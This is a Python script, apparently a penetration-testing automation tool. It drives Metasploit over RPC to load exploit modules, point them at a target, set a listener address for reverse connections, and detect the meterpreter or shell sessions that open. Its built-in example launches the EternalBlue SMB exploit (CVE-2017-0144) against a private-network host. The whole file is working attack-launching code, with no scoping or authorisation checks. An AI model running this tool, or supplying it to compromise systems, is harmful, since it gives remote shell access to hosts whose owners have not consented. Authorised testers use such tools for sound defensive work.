"""
Enhanced Pentest Automation Tool
This version includes improved security, better error handling, and cleaner architecture
"""

import asyncio
import json
import os
import sys
import time
import logging
import socket
import netifaces
import re
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
import queue
from pymetasploit3.msfrpc import MsfRpcClient
from contextlib import asynccontextmanager
from logging.handlers import RotatingFileHandler
import yaml

# Configuration and Constants
CONFIG_PATH = "config.yaml"
MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
MAX_LOG_FILES = 5

class PentestAutomationError(Exception):
    """Base exception for pentest automation"""
    pass

class ConfigurationError(PentestAutomationError):
    """Configuration related errors"""
    pass

class ConnectionError(PentestAutomationError):
    """Connection related errors"""
    pass

class ExploitError(PentestAutomationError):
    """Exploit execution related errors"""
    pass

class ValidationError(PentestAutomationError):
    """Data validation related errors"""
    pass

class ExploitStatus(Enum):
    SUCCESS = "success"
    FAILURE = "failure"
    TIMEOUT = "timeout"
    ERROR = "error"

@dataclass
class ExploitConfiguration:
    target_ip: str
    target_port: int
    module_path: str
    cve: str
    options: Dict[str, Any]
    timeout: Optional[int] = None
    retry_count: int = 3
    
    def validate(self) -> bool:
        """Validate configuration parameters"""
        if not self.target_ip or not self.target_port:
            return False
        if not self.module_path or not self.cve:
            return False
        return True

@dataclass
class ExploitResult:
    target_ip: str
    target_port: int
    cve: str
    module_path: str
    status: ExploitStatus
    message: str
    timestamp: datetime
    execution_time: float
    session_id: Optional[str] = None

class SecureLogger:
    """Enhanced secure logging functionality"""
    
    def __init__(self, name: str, log_dir: str = "logs"):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.DEBUG)
        
        # Ensure log directory exists
        os.makedirs(log_dir, exist_ok=True)
        
        # Create secure log file with rotation
        log_file = os.path.join(log_dir, f'{name}_{datetime.now().strftime("%Y%m%d")}.log')
        file_handler = RotatingFileHandler(
            log_file,
            maxBytes=MAX_LOG_SIZE,
            backupCount=MAX_LOG_FILES,
            mode='a'
        )
        file_handler.setLevel(logging.DEBUG)
        
        # Create console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        
        # Create formatters
        file_formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(threadName)s - %(message)s'
        )
        console_formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        )
        
        # Set formatters
        file_handler.setFormatter(file_formatter)
        console_handler.setFormatter(console_formatter)
        
        # Add handlers
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)
    
    def _mask_sensitive_info(self, message: str) -> str:
        """Mask sensitive information in log messages"""
        patterns = [
            (r'password["\s]*:["\s]*[^"}\s]+', 'password: *****'),
            (r'session[_\s]?id["\s]*:["\s]*[^"}\s]+', 'session_id: *****'),
            (r'token["\s]*:["\s]*[^"}\s]+', 'token: *****'),
            (r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', '[MASKED_IP]')
        ]
        for pattern, replacement in patterns:
            message = re.sub(pattern, replacement, message, flags=re.IGNORECASE)
        return message
    
    def info(self, message: str):
        self.logger.info(self._mask_sensitive_info(message))
    
    def error(self, message: str):
        self.logger.error(self._mask_sensitive_info(message))
    
    def debug(self, message: str):
        self.logger.debug(self._mask_sensitive_info(message))
    
    def warning(self, message: str):
        self.logger.warning(self._mask_sensitive_info(message))
    
    def critical(self, message: str):
        self.logger.critical(self._mask_sensitive_info(message))

class PentestAutomation:
    def __init__(self, config_path: str):
        """Initialize with configuration file"""
        self.logger = SecureLogger(__name__)
        self.config = self._load_config(config_path)
        self.results_queue: queue.Queue = queue.Queue()
        self.active_sessions: Dict[str, Any] = {}
        
        # Initialize connection
        self._initialize_connection()
    
    def _load_config(self, config_path: str) -> Dict:
        """Load configuration from YAML file"""
        try:
            with open(config_path, 'r') as f:
                config = yaml.safe_load(f)
                
            required_fields = ['msf_host', 'msf_port', 'msf_password', 'lhost', 'lport']
            for field in required_fields:
                if field not in config:
                    raise ConfigurationError(f"Missing required configuration field: {field}")
            
            return config
        except Exception as e:
            raise ConfigurationError(f"Failed to load configuration: {str(e)}")
    
    def _initialize_connection(self):
        """Initialize connection to Metasploit RPC server"""
        try:
            self.client = MsfRpcClient(
                password=self.config['msf_password'],
                server=self.config['msf_host'],
                port=self.config['msf_port']
            )
            self.logger.info("Successfully connected to Metasploit RPC server")
        except Exception as e:
            raise ConnectionError(f"Failed to connect to Metasploit RPC server: {str(e)}")
    
    @asynccontextmanager
    async def _managed_console(self):
        """Context manager for Metasploit console"""
        console = None
        try:
            console = self.client.consoles.console()
            yield console
        finally:
            if console:
                try:
                    await asyncio.wait_for(
                        asyncio.to_thread(console.destroy),
                        timeout=5.0
                    )
                except Exception as e:
                    self.logger.error(f"Failed to destroy console: {str(e)}")

    async def run_exploit(self, config: ExploitConfiguration) -> ExploitResult:
        """Execute exploit with enhanced error handling and resource management"""
        start_time = time.time()
        
        if not config.validate():
            raise ValidationError("Invalid exploit configuration")
        
        try:
            async with self._managed_console() as console:
                module = self.client.modules.use('exploit', config.module_path)
                
                # Configure exploit
                module['RHOSTS'] = config.target_ip
                module['RPORT'] = config.target_port
                module['LHOST'] = self.config['lhost']
                module['LPORT'] = self.config['lport']
                
                for opt, value in config.options.items():
                    if opt not in ['RHOSTS', 'RPORT', 'LHOST', 'LPORT']:
                        module[opt] = value
                
                # Execute exploit with timeout
                result = await asyncio.wait_for(
                    self._execute_exploit(module, console),
                    timeout=config.timeout or self.config.get('default_timeout', 30)
                )
                
                execution_time = time.time() - start_time
                
                if result.get('success'):
                    status = ExploitStatus.SUCCESS
                    message = "Exploit completed successfully"
                    session_id = result.get('session_id')
                else:
                    status = ExploitStatus.FAILURE
                    message = result.get('message', "Exploit failed")
                    session_id = None
                
        except asyncio.TimeoutError:
            status = ExploitStatus.TIMEOUT
            message = f"Exploit execution timed out"
            execution_time = time.time() - start_time
            session_id = None
            
        except Exception as e:
            status = ExploitStatus.ERROR
            message = str(e)
            execution_time = time.time() - start_time
            session_id = None
            self.logger.error(f"Exploit error: {str(e)}")
        
        result = ExploitResult(
            target_ip=config.target_ip,
            target_port=config.target_port,
            cve=config.cve,
            module_path=config.module_path,
            status=status,
            message=message,
            timestamp=datetime.now(),
            execution_time=execution_time,
            session_id=session_id
        )
        
        self.results_queue.put(result)
        return result

    async def _execute_exploit(self, module: Any, console: Any) -> Dict[str, Any]:
        """Execute exploit and monitor for success"""
        try:
            sessions_before = set(self.client.sessions.list.keys())
            
            # Execute exploit
            exploit_result = module.execute()
            
            # Monitor for new session
            for _ in range(10):  # Check for 10 seconds
                await asyncio.sleep(1)
                sessions_after = set(self.client.sessions.list.keys())
                new_sessions = sessions_after - sessions_before
                
                if new_sessions:
                    session_id = list(new_sessions)[0]
                    self.active_sessions[session_id] = {
                        'created_at': datetime.now(),
                        'module': module.modulename
                    }
                    return {
                        'success': True,
                        'session_id': session_id
                    }
            
            # Check console output for success indicators
            output = console.read()
            if any(indicator in output.lower() for indicator in [
                'session opened',
                'success',
                'meterpreter session',
                'command shell session'
            ]):
                return {
                    'success': True,
                    'message': 'Exploit completed successfully'
                }
            
            return {
                'success': False,
                'message': 'No session established'
            }
            
        except Exception as e:
            return {
                'success': False,
                'message': str(e)
            }

    async def cleanup_sessions(self):
        """Cleanup old or inactive sessions"""
        try:
            current_time = datetime.now()
            for session_id, session_info in list(self.active_sessions.items()):
                if (current_time - session_info['created_at']).total_seconds() > self.config.get('session_timeout', 3600):
                    try:
                        self.client.sessions.session(session_id).stop()
                        del self.active_sessions[session_id]
                        self.logger.info(f"Cleaned up session {session_id}")
                    except Exception as e:
                        self.logger.error(f"Failed to cleanup session {session_id}: {str(e)}")
        except Exception as e:
            self.logger.error(f"Session cleanup error: {str(e)}")

    def save_results(self, results: List[ExploitResult], output_file: str):
        """Save results to file with sensitive data masking"""
        try:
            output_data = []
            for result in results:
                result_dict = {
                    'timestamp': result.timestamp.isoformat(),
                    'target_ip': '[MASKED]',  # Mask IP for security
                    'target_port': result.target_port,
                    'cve': result.cve,
                    'status': result.status.value,
                    'message': result.message,
                    'execution_time': result.execution_time
                }
                output_data.append(result_dict)
            
            with open(output_file, 'w') as f:
                json.dump(output_data, f, indent=2)
            
            self.logger.info(f"Results saved to {output_file}")
            
        except Exception as e:
            self.logger.error(f"Failed to save results: {str(e)}")

async def main():
    if len(sys.argv) != 2:
        print("Usage: python pentest_automation.py <config.yaml>")
        sys.exit(1)
    
    try:
        automation = PentestAutomation(sys.argv[1])
        
        # Example usage
        config = ExploitConfiguration(
            target_ip="192.168.1.100",
            target_port=445,
            module_path="exploit/windows/smb/ms17_010_eternalblue",
            cve="CVE-2017-0144",
            options={},
            timeout=30
        )
        
        result = await automation.run_exploit(config)
        await automation.cleanup_sessions()
        
        automation.save_results([result], "exploit_results.json")
        
    except Exception as e:
        logging.error(f"Critical error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())